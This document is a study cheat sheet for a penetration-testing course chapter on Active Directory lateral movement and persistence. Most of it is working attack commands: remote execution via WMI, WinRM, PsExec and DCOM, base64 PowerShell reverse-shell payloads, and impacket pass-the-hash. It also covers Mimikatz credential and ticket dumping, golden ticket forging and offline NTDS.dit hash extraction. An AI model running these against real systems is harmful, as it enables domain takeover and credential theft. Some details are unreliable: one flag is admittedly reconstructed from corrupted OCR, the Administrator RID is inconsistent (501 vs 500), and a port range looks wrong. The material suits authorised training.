# Lateral Movement in Active Directory Cheat Sheet (PEN-200, Ch. 24)

Prior modules found high-value AD targets, harvested password hashes, and recovered Kerberos tickets. This module uses that material to **move laterally** — authenticate to new hosts and gain code execution using a hash or ticket instead of a cracked plaintext password (cracking is slow/unreliable, and neither NTLM nor Kerberos use the cleartext password directly).

- MITRE mapping: lateral movement here = **Use Alternate Authentication Material** (reuse valid accounts, password hashes, Kerberos tickets, or application access tokens gathered in earlier attack stages).
- AD enumeration skills remain relevant during lateral movement — newly compromised hosts can expose previously undiscovered network segments.

---

## 24.1 Active Directory Lateral Movement Techniques

### 24.1.1 WMI and WinRM

**WMI (Windows Management Instrumentation)** — object-oriented feature for task automation; can create remote processes via the `Create` method of the `Win32_Process` class.
- Transport: RPC over **TCP/135** (initial connection) + a higher dynamic port range **19152–65535** for session data.
- Requires credentials of a member of the local **Administrators** group (can be a domain user).
- Domain users are **not** subject to the UAC remote-restriction that blocks non-domain-joined local admins — full privileges apply when moving laterally this way.

`wmic` (deprecated, but historically the classic syntax):
```cmd
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "win32calc.exe"
```
Returns a `ProcessId` and `ReturnValue` (0 = success). The new process appears in Task Manager running as `jen`.

> **Info** — System processes/services always run in **Session 0** (session isolation, introduced in Windows Vista). Because the WMI Provider Host runs as a system service, processes created through WMI are also spawned in Session 0.

Same attack via PowerShell (CIM):
```powershell
$username = 'jen'
$password = 'Nexus123!'
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString

$sessionOption = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $sessionOption

$Command = 'calc'
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine=$Command};
```
Swap `$Command` for a base64-encoded reverse-shell one-liner to convert this into full lateral movement + shell:
```powershell
$Command = "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoAC4uLg=="
```
Catch it with `nc -lnvp 443` on Kali — confirm origin with `hostname` / `whoami` in the received shell.

**WinRM** — Microsoft's implementation of WS-Management; exchanges XML over HTTP/HTTPS.
- **TCP/5986** = encrypted HTTPS, **TCP/5985** = plain HTTP.
- Built-in CLI tool: `winrs` (Windows Remote Shell). Target user must be in **Administrators** or **Remote Management Users** group.

```cmd
winrs -r:files04 -u:jen -p:Nexus123! "cmd /c hostname & whoami"
```
Full reverse shell via `winrs` — replace the command with the base64 PowerShell payload:
```cmd
winrs -r:files04 -u:jen -p:Nexus123! "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoAC4uLg=="
```

**PowerShell Remoting** (native WinRM, `New-PSSession`):
```powershell
$username = 'jen'
$password = 'Nexus123!'
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString

New-PSSession -ComputerName 192.168.50.73 -Credential $credential
Enter-PSSession <SessionId>      # attach to the returned session Id
```
`Enter-PSSession` drops you into an interactive remote prompt (`[192.168.50.73]: PS C:\Users\jen\...>`) — verify with `whoami` / `hostname`.

---

### 24.1.2 PsExec

PsExec (SysInternals suite, Mark Russinovich) replaces telnet-like remote execution tools with an interactive console session.

Requirements to abuse it for lateral movement:
1. Authenticating user must be a member of the local **Administrators** group.
2. The **ADMIN$** share must be available (default on modern Windows Server).
3. **File and Printer Sharing** must be enabled (default on modern Windows Server).

Mechanics: PsExec (1) writes `psexesvc.exe` to `C:\`, (2) creates/spawns a service on the remote host, (3) runs the requested program as a child process of `psexesvc.exe`.

```cmd
PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd
```
`-i` = interactive session. Result: an interactive shell on the target as `corp\jen` — no reverse shell / listener on Kali required.

---

### 24.1.3 Pass the Hash (PtH)

Authenticate to a remote system/service using a user's **NTLM hash** instead of the plaintext password.

> Only works against services using **NTLM** authentication — does **not** work against Kerberos-only services. MITRE sub-technique: Use Alternate Authentication Material.

Tools that implement PtH: **PsExec (Metasploit)**, the **pass-the-hash toolkit**, **Impacket**.

Mechanics: attacker connects to the victim over **SMB (TCP/445)**, authenticates with the NTLM hash, then (if remote code execution is the goal) abuses the **Service Control Manager API** to start a Windows service (`cmd.exe`/PowerShell) and communicates with it over **named pipes**. PtH itself doesn't require creating a service if only accessing an SMB share.

Requirements: SMB reachable (TCP/445), the **ADMIN$** share available, and local administrator credentials (or the hash thereof).

```bash
/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
```
(`-hashes LM:NTLM` — empty LM half is fine.) Drops a semi-interactive `wmiexec` shell.

> PtH works for AD **domain accounts** and the built-in **local Administrator** account (RID 500). Since a 2014 Microsoft security update, it can **no longer** be used to authenticate as any *other* local admin account on a different host — only the true built-in Administrator.

---

### 24.1.4 Overpass the Hash (a.k.a. Pass the Key)

Use a cached NTLM hash to obtain a full Kerberos **TGT**, then request a **TGS** from that — i.e., "overpass" NTLM into Kerberos rather than replaying NTLM directly.

Walkthrough:
1. Cause the target user's credentials to be cached in LSASS on a workstation — e.g. shift + right-click an app → "Run as different user" and authenticate as `jen`. Credentials are now cached on that machine.
2. Dump them with Mimikatz:
```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```
Look for the target's `msv` block → `NTLM : 369def79d8372408bf6e93364cc93075`.

3. Spawn a new process carrying that NTLM hash (overpass-the-hash):
```
mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
```
> `/run:` specifies the process to create (here, a new PowerShell window). `whoami` inside that new session may still show the **original** user (e.g. `jeff`) — this is expected/correct behavior; `whoami` only inspects the current process token, not any imported Kerberos material.

4. `klist` immediately after → **0 cached tickets** (no interactive/network logon triggered yet).
5. Trigger any action requiring domain auth to force a TGT/TGS request, e.g.:
```powershell
net use \\files04\backup
```
6. `klist` again → now shows a **TGT** (`Server: krbtgt/CORP.COM@CORP.COM`) and a **TGS** (`Server: cifs/files04@CORP.COM`).
7. Use any Kerberos-capable tool (e.g. official SysInternals PsExec) against the **hostname** to get code execution using the forged Kerberos material:
```cmd
PsExec.exe \\files04 cmd.exe
```

> **Gotcha:** connecting by **hostname** forces Kerberos auth (uses the TGT/TGS you just built); connecting by raw **IP address** forces NTLM auth instead and can behave completely differently (see the Golden Ticket section below for the same IP-vs-hostname trap).

---

### 24.1.5 Pass the Ticket (PtT)

- **TGT** — not host-bound; reusable across systems for its lifetime (~10 hours by default); used to request TGS for arbitrary services.
- **TGS** — bound to a specific Service Principal Name (SPN); valid only for that one service; **not** reusable across different systems/services.

PtT abuses the TGS: export it from memory and re-inject it elsewhere to authenticate to that specific service. If the TGS belongs to the *current* user's own session (just replaying it), **no administrative privileges are required**.

Scenario: `dave` has access to `\\web04\backup`; the current user `jen` does not. Confirm the denial first:
```powershell
PS> ls \\web04\backup
# Access to the path '\\web04\backup' is denied. [UnauthorizedAccessException]
```

Export every cached TGT/TGS on the box (requires local admin to read LSASS, unlike the replay step itself):
```
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```
Produces `.kirbi` files named `[luid]-#-#-flags-user@service-domain.kirbi`, e.g.:
```
[0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi     <- TGS for CIFS on web04
[0;12bd0]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi <- TGT
```

Inject the desired TGS into the current session:
```
mimikatz # kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```
Verify with `klist` — the injected ticket (`dave @ CORP.COM`, server `cifs/web04@CORP.COM`) now shows in the cache. Access the resource:
```powershell
PS> ls \\web04\backup
```
Now succeeds — access obtained by impersonating `dave`'s ticket without ever touching his password/hash or needing admin rights on `web04`.

---

### 24.1.6 DCOM

**DCOM** (Distributed Component Object Model) extends Microsoft's **COM** for cross-machine component interaction — both are very old Windows technologies.
- Transport: RPC over **TCP/135**.
- Requires local administrator access to call the DCOM **Service Control Manager** API.
- Technique below (documented by Cybereason, discovered by Matt Nelson) abuses the **MMC Application** COM object's `ExecuteShellCommand` method (MMC = Microsoft Management Console, used for legit scripted automation — hence relatively low AV/EDR suspicion).

Instantiate the remote MMC COM object:
```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
```
Call `ExecuteShellCommand` (params: `Command`, `Directory`, `Parameters`, `WindowState` — only `Command`/`Parameters` typically matter):
```powershell
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
```
Runs in **Session 0** on the target — verify remotely with:
```cmd
tasklist | findstr "calc"
```

Full reverse shell — swap the parameters for the base64 PowerShell payload:
```powershell
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoAC4uLg==","7")
```
Catch on Kali with `nc -lnvp 443` as usual.

---

## Lateral Movement Technique Summary

| Technique | Transport | Local Admin? | Key Command/Cmdlet |
|---|---|---|---|
| WMI | RPC TCP/135 + 19152–65535 | Yes (or domain user in local Admins) | `wmic ... process call create`, `Invoke-CimMethod` |
| WinRM / WinRS | TCP/5985 (HTTP), 5986 (HTTPS) | Admins or Remote Management Users | `winrs -r:`, `New-PSSession` / `Enter-PSSession` |
| PsExec | SMB (ADMIN$) | Yes | `PsExec64.exe -i \\host -u user -p pass cmd` |
| Pass the Hash | SMB TCP/445 | Yes (target of hash) | `impacket-wmiexec -hashes :NTLM user@ip` |
| Overpass the Hash | Kerberos (KDC) + SMB | No (to convert); target op may need rights | `sekurlsa::pth /ntlm: /run:` |
| Pass the Ticket | Kerberos (KDC) | No, if reusing own TGS | `sekurlsa::tickets /export`, `kerberos::ptt` |
| DCOM | RPC TCP/135 | Yes | `ExecuteShellCommand` via `MMC20.Application` |

---

## 24.2 Active Directory Persistence

MITRE **persistence** tactic: techniques that keep an attacker's foothold on the target network alive across reboots or even credential changes. Traditional (non-AD) persistence methods still apply, but AD offers domain-specific options too.

> **Note** — In many real-world pentests/red-team engagements, persistence is **out of scope** due to the risk of incomplete removal once the assessment ends. Always confirm scope/rules of engagement before deploying a persistence mechanism.

### 24.2.1 Golden Ticket

Every Kerberos TGT is encrypted by the KDC using the password hash of the domain's **krbtgt** account — a shared secret known to all DCs in the domain. If an attacker obtains this hash, they can forge their own self-made TGT (a **Golden Ticket**) granting arbitrary access/group membership — a durable persistence and privilege-escalation primitive.

> **Caution** — Creating a Golden Ticket has serious blast radius (effectively unlimited domain access). Explicitly obtain the client's permission before executing this technique.

Requirements to obtain the krbtgt hash in the first place: Domain Admin group access, or compromise of the domain controller itself.

Demonstrated failure first (no rights yet):
```cmd
PsExec64.exe \\DC1 cmd.exe
:: Couldn't access DC1: Access is denied.
```

Dump the krbtgt hash from the DC with Mimikatz's LSA dump module (run locally on the DC once Domain Admin/DC access is obtained):
```
mimikatz # lsadump::lsa /patch
```
> Exact flag reconstructed from a corrupted OCR page — the intent per the surrounding text is: run Mimikatz's `lsadump` module directly on the domain controller to dump every domain account's hash, including `krbtgt`. Output includes each account's RID, LM, and NTLM hash, e.g.:
```
User : Administrator     RID : 000001f5 (501)   NTLM : 2892d26cdf84d7a70e2eb3b9f05c425e
User : krbtgt            RID : (502)             NTLM : 1693c6cefafffc7af11ef34d1c788f47
```
Also note the domain SID printed alongside (e.g. `S-1-5-21-1987370270-658905905-1781884369`) — needed for the golden ticket command below (get it independently any time via `whoami /user`).

Purge existing tickets from the current session, then forge and inject the golden ticket:
```
mimikatz # kerberos::purge
mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
```
- `/krbtgt:<hash>` (instead of `/rc4:<hash>`) tells Mimikatz you're supplying the krbtgt account's password hash.
- `/ptt` injects the forged ticket directly into the current session's memory.
- **Forging the ticket requires no admin rights** and can even be done from a non-domain-joined machine — only *obtaining* the krbtgt hash requires DA/DC access.

> Starting **July 2022**, Microsoft tightened Kerberos auth: the `/user` supplied to `kerberos::golden` must now correspond to an **existing** account (here `jen`). Previously an arbitrary/nonexistent username worked.

- Default user RID = **500** (built-in domain Administrator) if not otherwise influenced.
- Default Groups ID list = the domain's most privileged groups, including **Domain Admins (512)**.

If needed to bypass a blocked `cmd.exe`, Mimikatz can patch it:
```
mimikatz # misc::cmd
:: Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD'
```

Use the injected golden ticket with PsExec — **by hostname**, which routes through Kerberos:
```cmd
PsExec.exe \\dc1 cmd.exe
whoami /groups
:: CORP\Domain Admins, CORP\Enterprise Admins, CORP\Schema Admins, CORP\Group Policy Creator Owners, ...
```
This is itself an **overpass-the-hash** in action — the forged TGT is used to authenticate via Kerberos.

> **Gotcha** — Connecting PsExec to the DC's **IP address** instead of its hostname forces **NTLM** authentication, and access is denied even with a valid golden ticket injected, because the golden ticket only satisfies Kerberos auth — it does nothing for an NTLM-based logon attempt. Always target by hostname when relying on injected Kerberos material.

> **Info** — Domain Functional Level dictates domain capabilities and which Windows Server versions can run as a DC. Higher functional levels enable more features and security mitigations. The krbtgt password is **only** rotated automatically when the domain functional level is upgraded from a **pre-2008** Windows Server — not on any newer upgrade — so very old krbtgt hashes (and therefore very long-lived Golden Ticket exposure) are common in real environments.

### 24.2.2 Shadow Copies — offline NTDS.dit extraction

**Volume Shadow Copy Service (VSS)** is a Microsoft backup technology that snapshots a volume, including files normally locked/in-use (like `ntds.dit`). Managed via the Microsoft-signed `vshadow.exe` (part of the Windows SDK).

Requires Domain Admin access, run from an elevated prompt on the DC:
```cmd
vshadow.exe -nw -p C:
```
- `-nw` — disable writers (speeds up snapshot creation).
- `-p` — persist the shadow copy to disk.

Output includes the shadow copy device name, e.g. `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2`.

Copy the AD database out of the snapshot:
```cmd
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
```
Save the SYSTEM registry hive (needed to decrypt `ntds.dit`):
```cmd
reg.exe save hklm\system c:\system.bak
```
Transfer both `.bak` files to Kali, then extract every domain credential **offline** with Impacket:
```bash
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```
Output: full NTLM hash (and Kerberos AES/DES key) dump for every domain account — regular users, machine accounts (`HOST$`), and `krbtgt`:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1693c6cefafffc7af11ef34d1c788f47:::
jen:1124:aad3b435b51404eeaad3b435b51404ee:369def79d8372408bf6e93364cc93075:::
...
krbtgt:des-cbc-md5:683bdcba9e7c5de9
```
Crack these offline or reuse directly (pass-the-hash / overpass-the-hash / golden ticket).

> **Tip** — This method leaves an access trail (disk writes, requires uploading `vshadow.exe`/tools). A less conspicuous alternative to harvest the same data is the **DCSync** method (Mimikatz `lsadump::dcsync`, covered in the credential-dumping module) — it pulls hashes over the wire using directory-replication rights, without touching `ntds.dit` or uploading tools to the DC.

> Most standard penetration tests don't strictly require covert operation, but it's worth evaluating each technique's stealthiness anyway — the same judgment matters directly on red-team engagements.

---

## 24.3 Wrapping Up

This chapter closes out the AD module with an overview of lateral movement and persistence techniques — far from exhaustive; many more exist (and others are still being discovered). Technique effectiveness always depends on the target environment's security posture, design complexity, and interoperability with legacy systems that may impose lower security standards.

Stealth itself is **not emphasized** as a general pentest requirement in this course, but the same tradecraft becomes a hard requirement on red-team engagements. Mastery of AD enumeration, authentication, and lateral movement techniques is a core step toward becoming a proficient penetration tester.

---

## Key Takeaways / Workflow Summary

1. **Prefer hash/ticket reuse over cracking** — Kerberos/NTLM don't need the cleartext password; PtH, overpass-the-hash, and PtT all sidestep cracking entirely.
2. **Pick the right rail for your material:**
   - Have an **NTLM hash** + need code exec via SMB → **Pass the Hash** (`impacket-wmiexec -hashes`).
   - Have an NTLM hash but want **Kerberos** (bypasses NTLM-only restrictions/2014 PtH patch) → **Overpass the Hash** (`sekurlsa::pth`) → generates TGT/TGS → use with hostname-based tools.
   - Have/can export a **TGS** belonging to the current user → **Pass the Ticket** (`sekurlsa::tickets /export` + `kerberos::ptt`) — no admin rights needed if it's your own session's ticket.
   - Have **local admin** creds/hash and want an interactive shell → **PsExec** or **WMI/WinRM/DCOM**.
3. **Always connect via hostname, not IP**, when relying on Kerberos material (golden ticket, overpass-the-hash) — IP-based connections force NTLM and will fail.
4. **Session 0 is normal** for WMI/DCOM-spawned processes — don't be confused when `whoami` in an overpass-the-hash shell still shows the original user; it only reflects the process token, not imported tickets.
5. **Golden Ticket = ultimate AD persistence**: get the krbtgt hash (needs DA/DC access first) → `kerberos::golden ... /krbtgt:<hash> /ptt` → domain-wide access until krbtgt is rotated (rare — only on functional-level upgrades from pre-2008).
6. **NTDS.dit extraction (vshadow + secretsdump)** dumps every domain credential offline but is noisy; **DCSync** achieves the same result more quietly over the wire.
7. **Scope check every persistence technique** before deploying it — often explicitly excluded from standard pentest engagements.
